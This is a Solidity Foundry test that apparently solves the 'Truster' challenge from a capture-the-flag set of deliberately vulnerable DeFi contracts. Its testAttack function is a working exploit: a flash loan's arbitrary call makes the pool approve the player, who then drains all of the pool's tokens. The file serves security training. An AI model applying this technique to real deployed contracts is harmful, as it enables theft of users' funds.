// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterLenderPoolTest is Test {
    TrusterLenderPool private pool;
    DamnValuableToken private token;
    address private player;
    uint256 private constant POOL_INITIAL_BALANCE = 1_000_000e18;

    function setUp() public {
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        player = makeAddr("player");
        token.transfer(address(pool), POOL_INITIAL_BALANCE);

        assertEq(token.balanceOf(address(pool)), POOL_INITIAL_BALANCE);
        assertEq(token.balanceOf(address(player)), 0);
    }

    function testAttack() public {
        // Exploit code:
        pool.flashLoan(
            0,
            address(player),
            address(token),
            abi.encodeWithSelector(token.approve.selector, address(player), POOL_INITIAL_BALANCE)
        );
        vm.startPrank(player);
        token.transferFrom(address(pool), address(player), POOL_INITIAL_BALANCE);
        vm.stopPrank();
        //
        validate();
    }

    function validate() public {
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(address(player)), POOL_INITIAL_BALANCE);
    }
}
